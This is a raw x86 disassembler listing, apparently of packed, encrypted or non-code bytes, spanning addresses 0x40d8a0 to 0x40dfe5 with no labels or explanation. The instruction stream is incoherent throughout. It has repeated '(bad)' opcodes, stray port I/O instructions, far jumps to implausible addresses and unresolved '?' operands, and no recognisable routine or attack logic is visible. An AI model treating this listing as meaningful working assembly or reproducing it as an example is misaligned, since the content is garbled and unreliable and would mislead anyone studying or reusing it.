  40d8a0:	mov    DWORD PTR [eax+ebx*1],esp
  40d8a3:	es in  al,0xb9
  40d8a6:	outs   dx,BYTE PTR ds:[esi]
  40d8a7:	ret    
  40d8a8:	pop    ds
  40d8a9:	xor    eax,0x9cbd990d
  40d8ae:	xchg   edx,eax
  40d8af:	adc    ah,BYTE PTR [edx+0x3e]
  40d8b2:	mov    esi,0xa11c3a0f
  40d8b7:	mov    DWORD PTR [esi],esi
  40d8b9:	(bad)  
  40d8ba:	pop    eax
  40d8bb:	adc    edx,DWORD PTR [edi]
  40d8bd:	iret   
  40d8be:	out    0xa3,al
  40d8c0:	push   0xfffffff9
  40d8c2:	xchg   BYTE PTR [edi],dh
  40d8c4:	add    dl,bh
  40d8c6:	lock pop edi
  40d8c8:	xlat   BYTE PTR ds:[ebx]
  40d8c9:	mov    ecx,0x8e1147b8
  40d8ce:	sub    DWORD PTR [ebx-0x52100200],edi
  40d8d4:	mov    ds:0x2e214ff0,eax
  40d8d9:	xadd   DWORD PTR [eax-0x7c],ecx
  40d8dd:	adc    al,0x84
  40d8df:	jle    0x40d93e
  40d8e1:	loopne 0x40d8d0
  40d8e3:	fcomp  DWORD PTR [eax]
  40d8e5:	jmp    0x9be588f2
  40d8ea:	sub    DWORD PTR ds:0xbfd0d034,ebp
  40d8f0:	or     al,0x47
  40d8f2:	inc    esp
  40d8f3:	xlat   BYTE PTR ds:[ebx]
  40d8f4:	or     DWORD PTR [ebx],0x7a
  40d8f7:	popf   
  40d8f8:	and    BYTE PTR [esi-0x3450370c],0xc5
  40d8ff:	imul   esi,DWORD PTR [ecx+esi*8+0x53],0x509f3cc8
  40d907:	dec    edx
  40d908:	cmp    eax,0x37dcaae9
  40d90d:	popa   
  40d90e:	pop    ebx
  40d90f:	ins    DWORD PTR es:[edi],dx
  40d910:	es in  al,dx
  40d912:	sub    edx,eax
  40d914:	pop    esp
  40d915:	lahf   
  40d916:	outs   dx,BYTE PTR ds:[esi]
  40d917:	loop   0x40d89c
  40d919:	in     al,0xf5
  40d91b:	adc    dh,0x21
  40d91e:	jp     0x40d8a7
  40d920:	frstor [ebx]
  40d922:	pusha  
  40d923:	and    eax,0xc86a50fd
  40d928:	jmp    0x40d8d9
  40d92a:	mov    bh,0x80
  40d92c:	mov    al,0xf4
  40d92e:	inc    ebp
  40d92f:	hlt    
  40d930:	jge    0x40d903
  40d932:	lahf   
  40d933:	(bad)  
  40d934:	xchg   edx,eax
  40d935:	add    DWORD PTR [edx],ecx
  40d937:	test   BYTE PTR [ecx-0x1c],cl
  40d93a:	arpl   WORD PTR [edx],bx
  40d93c:	lock popf 
  40d93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d93f:	daa    
  40d940:	sbb    eax,0xf4c16833
  40d945:	fdiv   DWORD PTR [edx]
  40d947:	ins    BYTE PTR es:[edi],dx
  40d948:	rcl    ch,0x13
  40d94b:	not    BYTE PTR [eax+eiz*8]
  40d94e:	cs test esi,0xbeb05e1
  40d955:	mov    al,0x9f
  40d957:	data16 out dx,al
  40d959:	scas   eax,DWORD PTR es:[edi]
  40d95a:	leave  
  40d95b:	imul   edi,ebx,0x5
  40d95e:	dec    edi
  40d95f:	es shl ebx,cl
  40d962:	dec    ebx
  40d963:	dec    esi
  40d964:	in     eax,dx
  40d965:	inc    ecx
  40d966:	add    al,0xa
  40d968:	dec    edi
  40d969:	div    BYTE PTR [eax]
  40d96b:	and    al,0xa7
  40d96d:	out    dx,al
  40d96e:	pop    ebx
  40d96f:	jne    0x40d9d6
  40d971:	inc    eax
  40d972:	xchg   ebx,eax
  40d973:	mov    al,0x7d
  40d975:	jge    0x40d999
  40d977:	pop    esi
  40d978:	mov    esp,0x3dfbaa58
  40d97d:	popa   
  40d97e:	add    eax,0xb8252691
  40d983:	xor    ebx,DWORD PTR ds:0x3534e18e
  40d989:	pop    ds
  40d98a:	test   edi,edx
  40d98c:	xchg   ebx,eax
  40d98d:	pop    ebp
  40d98e:	pop    edx
  40d98f:	pop    ds
  40d990:	in     eax,0xf8
  40d992:	sar    DWORD PTR [edi-0x221fbe3f],cl
  40d998:	push   0xd
  40d99a:	sub    DWORD PTR [edx+0x2],0x2b2295e7
  40d9a1:	enter  0xdbcc,0x7b
  40d9a5:	lods   al,BYTE PTR ds:[esi]
  40d9a6:	mov    edx,0xd4603f8e
  40d9ab:	fsub   QWORD PTR [ebp-0x28]
  40d9ae:	imul   ecx,DWORD PTR [ebp-0x6f],0x65
  40d9b2:	cmp    al,0x7e
  40d9b4:	repnz fisub DWORD PTR [esi]
  40d9b7:	stc    
  40d9b8:	test   al,0x15
  40d9ba:	push   es
  40d9bb:	jbe    0x40d963
  40d9bd:	pop    edi
  40d9be:	sub    BYTE PTR [ebx],bh
  40d9c0:	gs neg cl
  40d9c3:	xor    ebx,DWORD PTR ds:0x5b6fdddb
  40d9c9:	ja     0x40d9d1
  40d9cb:	arpl   WORD PTR [ebx-0x26],sp
  40d9ce:	mov    bh,0xdd
  40d9d0:	adc    BYTE PTR [edi],dh
  40d9d2:	je     0x40da21
  40d9d4:	sub    DWORD PTR [edx],esi
  40d9d6:	mov    eax,fs
  40d9d8:	and    DWORD PTR [ecx+0x23],eax
  40d9db:	xor    al,BYTE PTR [ebp-0x60edd3d8]
  40d9e1:	adc    al,0x5d
  40d9e3:	out    0x28,eax
  40d9e5:	pop    esi
  40d9e6:	and    edx,edi
  40d9e8:	es pop esp
  40d9ea:	pop    ds
  40d9eb:	lods   eax,DWORD PTR ds:[esi]
  40d9ec:	out    0x24,eax
  40d9ee:	loop   0x40da59
  40d9f0:	idiv   DWORD PTR [eax]
  40d9f2:	sbb    DWORD PTR [ebp-0xc05dbf0],ebp
  40d9f8:	jbe    0x40da08
  40d9fa:	inc    ebx
  40d9fb:	ins    BYTE PTR es:[edi],dx
  40d9fc:	mov    eax,0xe3cec34b
  40da01:	jmp    0x3014:0xbade4bb
  40da08:	into   
  40da09:	not    BYTE PTR [edi]
  40da0b:	lods   al,BYTE PTR ds:[esi]
  40da0c:	xor    edx,DWORD PTR [edx]
  40da0e:	jecxz  0x40da28
  40da10:	push   es
  40da11:	jae    0x40da88
  40da13:	lock mov cl,0xd6
  40da16:	es dec edi
  40da18:	push   0xffffffc2
  40da1a:	adc    DWORD PTR ds:0x41bb153e,ebx
  40da20:	jecxz  0x40da4d
  40da22:	out    0xbc,eax
  40da24:	and    eax,0xbd54cda0
  40da29:	adc    DWORD PTR [esp+esi*1-0x7568c4c2],ebp
  40da30:	jne    0x40da6b
  40da32:	push   esp
  40da33:	adc    DWORD PTR [ebp-0x45],esi
  40da36:	cs sub al,0x7f
  40da39:	outs   dx,DWORD PTR ds:[esi]
  40da3a:	lea    edi,[ebx-0x4]
  40da3d:	repz in eax,0x1e
  40da40:	sub    BYTE PTR [edx+0x6d4ff284],dh
  40da46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da47:	ss sti 
  40da49:	fbstp  TBYTE PTR [ecx+0x4b]
  40da4c:	inc    edi
  40da4d:	sub    eax,0xe708b846
  40da52:	iret   
  40da53:	daa    
  40da54:	xchg   ecx,eax
  40da55:	jp     0x40da68
  40da57:	das    
  40da58:	push   esi
  40da59:	mov    esp,0x3681c8cc
  40da5e:	cmp    DWORD PTR [eax+0x65f2a215],esi
  40da64:	or     ebx,esi
  40da66:	fwait
  40da67:	bound  ebx,QWORD PTR [edi+ebp*2-0x3b]
  40da6b:	push   es
  40da6c:	enter  0x76aa,0x54
  40da70:	retf   0x7b67
  40da73:	push   ebp
  40da74:	dec    ebx
  40da75:	sub    BYTE PTR [edi+0xc560519],0x60
  40da7c:	repz fcomp QWORD PTR [ebp-0x6a]
  40da80:	aaa    
  40da81:	imul   esi,DWORD PTR [ecx],0x59
  40da84:	mov    BYTE PTR [eax-0x64],al
  40da87:	adc    BYTE PTR [esp+esi*4],cl
  40da8a:	dec    ebx
  40da8b:	loopne 0x40dae8
  40da8d:	inc    ecx
  40da8e:	cs and eax,0xa8d52ff4
  40da94:	sub    al,0xdd
  40da96:	mov    bl,0x80
  40da98:	das    
  40da99:	(bad)  
  40da9a:	leave  
  40da9b:	mov    ds:0x358e29ab,eax
  40daa0:	rcr    DWORD PTR [ecx+0x7ed2bcf2],1
  40daa6:	gs dec edx
  40daa8:	pop    ebp
  40daa9:	xchg   ebx,eax
  40daaa:	les    edx,FWORD PTR [edx]
  40daac:	pushf  
  40daad:	mov    ah,0x3b
  40daaf:	xchg   ebp,eax
  40dab0:	(bad)  
  40dab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab2:	dec    esp
  40dab3:	push   cs
  40dab4:	pop    es
  40dab5:	push   ecx
  40dab6:	xchg   cl,ah
  40dab8:	add    cl,BYTE PTR [ebx]
  40daba:	jmp    0x587c8e2b
  40dabf:	push   ds
  40dac0:	daa    
  40dac1:	pop    edx
  40dac2:	fidiv  DWORD PTR [edx-0x5796e268]
  40dac8:	ss pushf 
  40daca:	clc    
  40dacb:	jmp    0xf7e787fc
  40dad0:	adc    BYTE PTR gs:[esi],al
  40dad3:	test   dh,bl
  40dad5:	xor    BYTE PTR [eax-0x56],0x8e
  40dad9:	adc    eax,DWORD PTR [edx-0x3b7e71c8]
  40dadf:	xchg   ebx,eax
  40dae0:	cmp    DWORD PTR [eax-0x36],0x51
  40dae4:	jl     0x40da68
  40dae6:	adc    eax,0x65cfb537
  40daeb:	or     esi,DWORD PTR [eax]
  40daed:	inc    esi
  40daee:	or     eax,0x1f46a1c1
  40daf3:	push   edi
  40daf4:	out    0x56,eax
  40daf6:	shl    BYTE PTR [ecx+0x3d0a831d],0x16
  40dafd:	stos   DWORD PTR es:[edi],eax
  40dafe:	push   es
  40daff:	cmc    
  40db00:	nop
  40db01:	aaa    
  40db02:	rol    DWORD PTR [ecx],1
  40db04:	jp     0x40dac3
  40db06:	jnp    0x40daf6
  40db08:	inc    esp
  40db09:	jae    0x40dad5
  40db0b:	inc    edx
  40db0c:	xor    BYTE PTR [ecx+0x22fb4f9e],cl
  40db12:	pop    ebp
  40db13:	mov    WORD PTR [edx+0x7cd99d55],fs
  40db19:	int3   
  40db1a:	retf   
  40db1b:	dec    esp
  40db1c:	ret    0xd9ce
  40db1f:	or     al,BYTE PTR cs:[edi+0x44]
  40db23:	pusha  
  40db24:	inc    ebx
  40db25:	loop   0x40dac4
  40db27:	inc    ebp
  40db28:	xor    edi,0xeb41b5fa
  40db2e:	dec    esi
  40db2f:	leave  
  40db30:	inc    eax
  40db31:	xchg   esp,eax
  40db32:	fidiv  DWORD PTR [ecx]
  40db34:	jbe    0x40dae9
  40db36:	dec    esp
  40db37:	sbb    eax,0xb3cd518e
  40db3c:	into   
  40db3d:	dec    edi
  40db3e:	xchg   ecx,eax
  40db3f:	sti    
  40db40:	or     al,0x2d
  40db42:	ret    
  40db43:	(bad)  
  40db45:	in     eax,dx
  40db46:	fld    TBYTE PTR [ecx-0x5]
  40db49:	xor    BYTE PTR [ebx+eiz*2-0x4e6f0160],0x43
  40db51:	aaa    
  40db52:	and    dh,BYTE PTR [ebp+0x41d0b691]
  40db58:	xor    edx,DWORD PTR [eax]
  40db5a:	fld    DWORD PTR [ebx-0x5f]
  40db5d:	pop    ss
  40db5e:	retf   0x6c14
  40db61:	pop    ebp
  40db62:	hlt    
  40db63:	fs adc esi,ecx
  40db66:	out    dx,eax
  40db67:	test   al,0x4d
  40db69:	imul   esi,DWORD PTR [ebp-0x6c],0xffffff8d
  40db6d:	cli    
  40db6e:	popa   
  40db6f:	leave  
  40db70:	call   0xb8ac2898
  40db75:	add    eax,0x9cbce8fc
  40db7a:	loop   0x40dbba
  40db7c:	push   0xa00b5355
  40db81:	sub    esi,esi
  40db83:	por    mm7,mm0
  40db86:	pop    edi
  40db87:	dec    ebx
  40db88:	jne    0x40dc05
  40db8a:	sub    al,0x97
  40db8c:	shl    DWORD PTR [edx+esi*4+0x18],1
  40db90:	inc    edi
  40db91:	shl    cl,0xe4
  40db94:	iret   
  40db95:	repnz nop
  40db97:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40db99:	loopne 0x40db61
  40db9b:	(bad)  
  40db9c:	mov    ecx,0xee6c5541
  40dba1:	arpl   WORD PTR [ecx],dx
  40dba3:	je     0x40dbd4
  40dba5:	push   ebp
  40dba6:	add    al,0x3d
  40dba8:	mov    ch,0x44
  40dbaa:	mov    BYTE PTR ss:[edi+0x19],bl
  40dbae:	int    0x7c
  40dbb0:	hlt    
  40dbb1:	xchg   esp,eax
  40dbb2:	loope  0x40dbda
  40dbb4:	(bad)  
  40dbb6:	xchg   edi,eax
  40dbb7:	stc    
  40dbb8:	dec    ebx
  40dbb9:	cwde   
  40dbba:	ins    DWORD PTR es:[edi],dx
  40dbbb:	inc    eax
  40dbbc:	mov    ?,WORD PTR [edx+0x439267d]
  40dbc2:	push   edi
  40dbc3:	jo     0x40dbcb
  40dbc5:	fnsave [edi]
  40dbc7:	pop    ss
  40dbc8:	in     al,dx
  40dbc9:	xchg   edx,eax
  40dbca:	cmc    
  40dbcb:	mov    edx,0x74e5c838
  40dbd0:	mov    cl,0xcf
  40dbd2:	imul   edx,DWORD PTR [ebp-0x7f],0x4d8560e3
  40dbd9:	adc    dl,bl
  40dbdb:	or     bh,BYTE PTR ds:0x3cab77ed
  40dbe1:	pop    es
  40dbe2:	sbb    ch,BYTE PTR [ebp-0x2e]
  40dbe5:	add    DWORD PTR [edx],ecx
  40dbe7:	cdq    
  40dbe8:	fs popa 
  40dbea:	push   0x4e
  40dbec:	sbb    BYTE PTR [ecx+0x437a142a],dl
  40dbf2:	xchg   esp,eax
  40dbf3:	cwde   
  40dbf4:	pop    esi
  40dbf5:	ret    0x776a
  40dbf8:	dec    eax
  40dbf9:	sub    DWORD PTR [edx-0x79],0x53
  40dbfd:	not    ecx
  40dbff:	dec    esi
  40dc00:	cld    
  40dc01:	jnp    0x40dc2b
  40dc03:	dec    ebp
  40dc04:	xor    esp,esi
  40dc06:	xor    edi,DWORD PTR [ebp+0x5c]
  40dc09:	pop    edi
  40dc0a:	sub    DWORD PTR [eax],esi
  40dc0c:	out    dx,al
  40dc0d:	inc    eax
  40dc0e:	fild   QWORD PTR [ecx+0x48ace7e8]
  40dc14:	pop    esp
  40dc15:	mov    dl,0x9f
  40dc17:	mov    ds:0x334d767d,al
  40dc1c:	inc    edx
  40dc1d:	xor    ebx,DWORD PTR [ecx+0x5e9d2bce]
  40dc23:	(bad)  
  40dc24:	ins    DWORD PTR es:[edi],dx
  40dc25:	es inc esi
  40dc27:	fstp   TBYTE PTR [eax]
  40dc29:	fstp   st(3)
  40dc2b:	fistp  WORD PTR [eax]
  40dc2d:	and    eax,0x6e553387
  40dc32:	pop    esi
  40dc33:	outs   dx,BYTE PTR ds:[esi]
  40dc34:	pop    edx
  40dc35:	and    al,0x95
  40dc37:	push   cs
  40dc38:	ror    BYTE PTR [ebx-0x68cd6f62],0x76
  40dc3f:	ret    
  40dc40:	(bad)  
  40dc41:	imul   esi,ecx,0xffffffa9
  40dc44:	jbe    0x40dc9c
  40dc46:	fwait
  40dc47:	jne    0x40dc53
  40dc49:	xchg   ebp,eax
  40dc4a:	in     al,dx
  40dc4b:	pop    ebx
  40dc4c:	dec    esi
  40dc4d:	xor    al,ch
  40dc4f:	call   0xaf316539
  40dc54:	int3   
  40dc55:	gs retf 
  40dc57:	sbb    ebp,DWORD PTR [esi+0x31]
  40dc5a:	inc    ebp
  40dc5b:	sahf   
  40dc5c:	das    
  40dc5d:	ds dec ebp
  40dc5f:	lock aaa 
  40dc61:	jmp    0x9578:0x3e8ed539
  40dc68:	icebp  
  40dc69:	(bad)  
  40dc6a:	arpl   si,cx
  40dc6c:	arpl   WORD PTR [ebx],sp
  40dc6e:	lds    esp,FWORD PTR [ecx-0x1b]
  40dc71:	push   ds
  40dc72:	in     al,0xed
  40dc74:	mov    ebx,0xbb167ceb
  40dc79:	cmp    eax,0x4ff4f684
  40dc7e:	dec    ebx
  40dc7f:	pop    ds
  40dc80:	push   ss
  40dc81:	add    DWORD PTR [ecx],eax
  40dc83:	jae    0x40dcf9
  40dc85:	pop    ebx
  40dc86:	mov    al,0xe6
  40dc88:	jmp    0x40dc89
  40dc8a:	jbe    0x40dce4
  40dc8c:	or     BYTE PTR [ebx+ebx*8],ch
  40dc8f:	lea    esi,[ebx-0xc04f3f5]
  40dc95:	iret   
  40dc96:	inc    ebp
  40dc97:	pushfw 
  40dc99:	jno    0x40dc3f
  40dc9b:	xchg   esp,eax
  40dc9c:	ret    
  40dc9d:	int    0x64
  40dc9f:	(bad)
  40dca2:	push   ds
  40dca3:	(bad)  
  40dca4:	call   0x9fbd784a
  40dca9:	popf   
  40dcaa:	das    
  40dcab:	adc    DWORD PTR [ebx],ebx
  40dcad:	cwde   
  40dcae:	ret    0xb4f
  40dcb1:	dec    esp
  40dcb2:	enter  0xa614,0xc6
  40dcb6:	push   esp
  40dcb7:	out    0xae,eax
  40dcb9:	xchg   esi,eax
  40dcba:	jb     0x40dd1e
  40dcbc:	fld    TBYTE PTR [edi]
  40dcbe:	jne    0x40dcf0
  40dcc0:	lods   eax,DWORD PTR ds:[esi]
  40dcc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc2:	adc    eax,0xbfc3931d
  40dcc7:	retf   
  40dcc8:	pop    es
  40dcc9:	mov    edi,0xbefdbfb2
  40dcce:	pop    ecx
  40dccf:	push   ecx
  40dcd0:	add    DWORD PTR [edx],esp
  40dcd2:	sub    eax,0xe96165e2
  40dcd7:	add    al,0xc0
  40dcd9:	sub    ch,BYTE PTR [eax-0x3e06c5c7]
  40dcdf:	cs mov edx,0x7c7b4cca
  40dce5:	push   ss
  40dce6:	lds    edi,FWORD PTR [ecx+0x5f]
  40dce9:	mov    al,0x51
  40dceb:	imul   eax,DWORD PTR [edx],0xa7bcee72
  40dcf1:	das    
  40dcf2:	add    al,0x1c
  40dcf4:	jg     0x40dca5
  40dcf6:	je     0x40dcda
  40dcf8:	cwde   
  40dcf9:	retf   
  40dcfa:	jle    0x40dcf3
  40dcfc:	mov    esp,edi
  40dcfe:	fwait
  40dcff:	in     eax,dx
  40dd00:	test   DWORD PTR [ecx-0x4ff9c60e],esp
  40dd06:	and    eax,0xefe433b7
  40dd0b:	enter  0xc775,0xaa
  40dd0f:	scas   al,BYTE PTR es:[edi]
  40dd10:	sbb    BYTE PTR [edx-0x2732f046],cl
  40dd16:	dec    esp
  40dd17:	(bad)  [ebp+0x74d46395]
  40dd1d:	jle    0x40dcc8
  40dd1f:	nop
  40dd20:	lahf   
  40dd21:	sahf   
  40dd22:	adc    al,0x8a
  40dd24:	fidiv  WORD PTR [edi+0x15]
  40dd27:	jg     0x40dcb4
  40dd29:	mov    ah,0xc1
  40dd2b:	outs   dx,BYTE PTR ds:[esi]
  40dd2c:	aad    0xdb
  40dd2e:	jae    0x40dd6d
  40dd30:	mov    al,0xbf
  40dd32:	mov    ebp,DWORD PTR [eax-0x53]
  40dd35:	mov    edi,0x8225bf35
  40dd3a:	mov    WORD PTR [eax],cs
  40dd3c:	push   ebx
  40dd3d:	fs test eax,0x4ce6f215
  40dd43:	xor    ah,BYTE PTR [edi+0x5ece8e49]
  40dd49:	sbb    eax,0x86365efd
  40dd4e:	and    dl,BYTE PTR [ecx+ecx*1-0x7]
  40dd52:	mov    al,0x62
  40dd54:	ret    0xaab8
  40dd57:	mov    ah,0x80
  40dd5a:	adc    al,0x1c
  40dd5c:	in     al,0x47
  40dd5e:	sbb    WORD PTR [edi],ax
  40dd61:	pushf  
  40dd62:	ret    
  40dd63:	xchg   DWORD PTR [esi],esi
  40dd65:	push   esp
  40dd66:	adc    ebx,DWORD PTR [edi]
  40dd68:	xor    al,0x99
  40dd6a:	retf   
  40dd6b:	lock mov bh,0x9d
  40dd6e:	cld    
  40dd6f:	loop   0x40dd55
  40dd71:	js     0x40dda7
  40dd73:	mov    dh,0x4
  40dd75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd76:	mov    ah,dl
  40dd78:	mov    ss,WORD PTR [eax+ebx*2+0x4b]
  40dd7c:	xchg   esp,eax
  40dd7d:	stc    
  40dd7e:	jns    0x40ddb0
  40dd80:	mov    bh,0x7c
  40dd82:	adc    ebp,DWORD PTR [ebx+ebx*4]
  40dd85:	outs   dx,BYTE PTR ss:[esi]
  40dd87:	mov    ds:0x586f3ae1,al
  40dd8c:	push   esi
  40dd8d:	add    DWORD PTR [ebp+0xf],ebx
  40dd90:	push   cs
  40dd91:	and    BYTE PTR [esi+0x2a1a54ba],dh
  40dd97:	push   ss
  40dd98:	mov    ebp,0x596960d8
  40dd9d:	fcmovb st,st(1)
  40dd9f:	sbb    ebp,DWORD PTR ds:0x8ccfb9d9
  40dda5:	(bad)  
  40dda6:	(bad)
  40ddab:	nop
  40ddac:	jo     0x40ddff
  40ddae:	retf   
  40ddaf:	popa   
  40ddb0:	adc    DWORD PTR [ebx-0x45512e97],edi
  40ddb6:	pop    edi
  40ddb7:	push   esp
  40ddb8:	sub    al,0x77
  40ddba:	jns    0x40dd53
  40ddbc:	sub    BYTE PTR [edi-0x25],bh
  40ddbf:	jo     0x40dd6c
  40ddc1:	or     BYTE PTR [ebx-0x54],bh
  40ddc4:	stos   BYTE PTR es:[edi],al
  40ddc5:	lahf   
  40ddc6:	loop   0x40de02
  40ddc8:	xchg   ebp,eax
  40ddc9:	mov    ebp,0xaeb6e2fc
  40ddce:	shl    edx,cl
  40ddd0:	setns  BYTE PTR [esi+0x6e]
  40ddd4:	hlt    
  40ddd5:	mov    dl,0xe
  40ddd7:	icebp  
  40ddd8:	mov    eax,0x65241777
  40dddd:	call   0x890da318
  40dde2:	and    BYTE PTR [esi],dh
  40dde4:	popf   
  40dde5:	pop    edi
  40dde6:	mov    WORD PTR [ecx],cs
  40dde8:	push   esi
  40dde9:	mov    dl,0xd7
  40ddeb:	enter  0x3679,0xe4
  40ddef:	fwait
  40ddf0:	jmp    0x9c8ccc4f
  40ddf5:	push   cs
  40ddf6:	leave  
  40ddf7:	mov    bl,0x95
  40ddf9:	lods   al,BYTE PTR ds:[esi]
  40ddfa:	push   esp
  40ddfb:	idiv   DWORD PTR [edx+0x43]
  40ddfe:	adc    dl,ch
  40de00:	popa   
  40de01:	push   esi
  40de02:	cmp    bl,BYTE PTR [esp+edx*4+0x56]
  40de06:	retf   0x915b
  40de09:	mov    WORD PTR [esi+0x3c],fs
  40de0c:	and    cl,BYTE PTR [ecx+0x3f2fbc45]
  40de12:	cmp    DWORD PTR [esi+esi*1],ebp
  40de15:	(bad)  
  40de16:	(bad)  
  40de17:	nop
  40de18:	icebp  
  40de19:	repnz fild QWORD PTR [esi-0x4a]
  40de1d:	add    eax,0x6f5478a
  40de22:	xchg   esp,eax
  40de23:	push   ds
  40de24:	xor    BYTE PTR [ebp+0x591ecba5],bh
  40de2a:	das    
  40de2b:	cmp    al,0x82
  40de2d:	or     esi,DWORD PTR [esi+0x7a9cb5d5]
  40de33:	(bad)  
  40de34:	adc    BYTE PTR [ebx+0x260d5ae9],cl
  40de3a:	cld    
  40de3b:	int3   
  40de3c:	out    dx,eax
  40de3d:	fwait
  40de3e:	outs   dx,DWORD PTR ds:[esi]
  40de3f:	gs in  eax,0x4a
  40de42:	mov    esi,0x1ede39dd
  40de47:	adc    BYTE PTR [ebx-0x29],0xf0
  40de4b:	aad    0x77
  40de4d:	loop   0x40de04
  40de4f:	ret    
  40de50:	jp     0x40dde2
  40de52:	push   esp
  40de53:	mov    ebx,0x9b597637
  40de58:	aam    0x5
  40de5a:	pop    ds
  40de5b:	loopne 0x40deb9
  40de5d:	mov    ebp,0x81df8306
  40de62:	mov    ecx,0x835ee478
  40de67:	js     0x40de8a
  40de69:	add    eax,0x4001e13e
  40de6e:	loopne 0x40de53
  40de70:	test   ebx,esi
  40de72:	lds    esp,FWORD PTR [ebp+ecx*1+0x3e]
  40de76:	mov    ch,0x57
  40de78:	xlat   BYTE PTR ds:[ebx]
  40de79:	stos   BYTE PTR es:[edi],al
  40de7a:	jo     0x40de84
  40de7c:	cwde   
  40de7d:	sbb    al,0x49
  40de7f:	(bad)  
  40de80:	cmc    
  40de81:	mov    ?,WORD PTR [esi-0x36db1a06]
  40de87:	mov    edi,edi
  40de89:	pop    ebp
  40de8a:	ret    0x1a78
  40de8d:	sbb    ah,dh
  40de8f:	sub    ebp,DWORD PTR ss:[ebx+0xd1b88b3]
  40de96:	mov    edi,0xa5fd0ee
  40de9b:	dec    esi
  40de9c:	outs   dx,BYTE PTR ds:[esi]
  40de9d:	mov    esp,0x38830226
  40dea2:	xchg   edx,eax
  40dea3:	cmp    esi,DWORD PTR [eax+0xd7e4cf8]
  40dea9:	add    al,0x3
  40deab:	mov    ds,WORD PTR [edi-0x27]
  40deae:	out    0x0,al
  40deb0:	push   edi
  40deb1:	sbb    eax,0x35a5b70
  40deb6:	lds    esp,FWORD PTR [esi+0x7f87fd8f]
  40debc:	loop   0x40deb1
  40debe:	repnz sbb dl,0xd7
  40dec2:	inc    edx
  40dec3:	or     al,0xf6
  40dec5:	mov    ds:0xfe2c9975,al
  40deca:	or     esp,DWORD PTR [esi-0x6f]
  40decd:	jmp    0x40df05
  40decf:	mov    ah,0xa2
  40ded1:	sbb    al,0x94
  40ded3:	retf   
  40ded4:	into   
  40ded5:	pop    ecx
  40ded6:	dec    edi
  40ded7:	jae    0x40de6e
  40ded9:	pop    edi
  40deda:	jno    0x40df51
  40dedc:	repnz pop ecx
  40dede:	les    ebx,FWORD PTR [ebx+0x52f356c]
  40dee4:	clc    
  40dee5:	es jmp 0x5afc:0x1cc9cbf1
  40deed:	jns    0x40de8d
  40deef:	mov    eax,0x294e2bc2
  40def4:	aam    0xa8
  40def6:	fs push 0xffffffb4
  40def9:	retf   
  40defa:	mov    ds:0xf1ec47f3,eax
  40deff:	scas   eax,DWORD PTR es:[edi]
  40df00:	stc    
  40df01:	pop    ecx
  40df02:	stc    
  40df03:	mov    al,0x0
  40df05:	test   DWORD PTR [esi],ecx
  40df07:	pop    ecx
  40df08:	inc    edi
  40df09:	lods   eax,DWORD PTR ds:[esi]
  40df0a:	mov    ebx,0x9ec6e19b
  40df0f:	jns    0x40dea3
  40df11:	addr16 push edi
  40df13:	out    0x9e,al
  40df15:	push   eax
  40df16:	xor    eax,ebp
  40df18:	mov    ds:0x70f7d53c,eax
  40df1d:	or     bh,ah
  40df1f:	in     al,0x66
  40df21:	push   ss
  40df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df23:	push   ecx
  40df24:	dec    eax
  40df25:	repz push ebx
  40df27:	lods   al,BYTE PTR ds:[esi]
  40df28:	rol    DWORD PTR [ecx+0xf7de389],cl
  40df2e:	pusha  
  40df2f:	pop    ds
  40df30:	popa   
  40df31:	xchg   esp,eax
  40df32:	push   ecx
  40df33:	test   al,0x24
  40df35:	mov    edx,0x4cb37f7a
  40df3a:	mov    edi,0xa4b1dc72
  40df3f:	bnd jne 0x40decf
  40df42:	sub    BYTE PTR [edi+0x48],dl
  40df45:	lods   eax,DWORD PTR ds:[esi]
  40df46:	mov    al,0x9a
  40df48:	cs push ebx
  40df4a:	inc    esp
  40df4b:	test   al,0x78
  40df4d:	xchg   esi,eax
  40df4e:	les    edi,FWORD PTR [ecx-0x34b5c9e6]
  40df54:	jae    0x40df61
  40df56:	mov    dh,0xd8
  40df58:	mov    dh,0xc0
  40df5a:	adc    BYTE PTR [eax+0x57],dl
  40df5d:	sbb    edx,DWORD PTR [ecx]
  40df5f:	hlt    
  40df60:	out    0x49,eax
  40df62:	cmp    BYTE PTR [eax+0x76],0x2d
  40df66:	or     dh,BYTE PTR [eax-0x2b]
  40df69:	push   eax
  40df6a:	ror    ebx,1
  40df6c:	inc    edi
  40df6d:	xchg   al,dh
  40df6f:	jbe    0x40df33
  40df71:	mov    eax,ds:0x6e859f01
  40df76:	mov    edi,0xba2405e6
  40df7b:	xor    esp,DWORD PTR [eax]
  40df7d:	test   eax,0x730bf3be
  40df82:	scas   al,BYTE PTR es:[edi]
  40df83:	pop    ds
  40df84:	pop    ebp
  40df85:	push   esp
  40df86:	xchg   esi,edx
  40df88:	jo     0x40e007
  40df8a:	pushf  
  40df8b:	outs   dx,DWORD PTR ds:[esi]
  40df8c:	xor    BYTE PTR ds:0x3a196196,0x42
  40df93:	int    0x9e
  40df95:	fs push ebp
  40df97:	aas    
  40df98:	jge    0x40df66
  40df9a:	ret    0x5418
  40df9d:	cmp    dl,ah
  40df9f:	push   esi
  40dfa0:	call   0x82d16e52
  40dfa5:	mov    ds:0xe851d9da,al
  40dfaa:	je     0x40dfa5
  40dfac:	fst    DWORD PTR [eax]
  40dfae:	call   0x574a:0x816ecedc
  40dfb5:	retf   
  40dfb6:	adc    al,0x75
  40dfb8:	push   ebp
  40dfb9:	cld    
  40dfba:	xchg   ebx,eax
  40dfbb:	stos   BYTE PTR es:[edi],al
  40dfbc:	sar    BYTE PTR [ecx-0x1d9dc63c],1
  40dfc2:	mov    ch,0x54
  40dfc4:	sti    
  40dfc5:	ficom  WORD PTR [esi+esi*4]
  40dfc8:	add    esp,DWORD PTR [ecx+0xf]
  40dfcb:	arpl   WORD PTR [ecx-0x241aea2f],dx
  40dfd1:	push   esp
  40dfd2:	and    esi,DWORD PTR [ecx+ebp*4]
  40dfd5:	pusha  
  40dfd6:	inc    edx
  40dfd7:	add    dl,BYTE PTR [ebx+0x28]
  40dfda:	sbb    esp,DWORD PTR [ebp+edx*8+0x2f]
  40dfde:	mov    eax,0x29f782d0
  40dfe3:	fsubrp st(6),st
  40dfe5:	and    al,0x75
